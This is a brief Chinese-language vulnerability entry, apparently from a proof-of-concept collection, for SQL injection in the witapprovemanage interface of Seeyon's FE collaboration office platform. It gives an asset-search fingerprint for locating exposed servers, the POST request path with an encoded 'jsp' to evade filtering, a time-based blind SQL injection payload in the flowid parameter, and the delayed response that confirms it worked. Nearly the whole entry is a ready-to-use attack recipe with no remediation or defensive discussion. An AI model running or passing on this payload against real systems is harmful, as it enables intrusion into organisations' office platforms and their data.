# 致远互联FE协作办公平台witapprovemanage接口存在sql注入漏洞

致远OA ｜ SQL注入 ｜ —
- **指纹**：`app="致远互联-FE"`
- **请求**：`POST /witapprovemanage/apprvaddNew.j%73p HTTP/1.1`

**Payload**
```
flowid=1';WAITFOR+DELAY+'0:0:5'--
```
- **响应特征**：200 响应时间>=5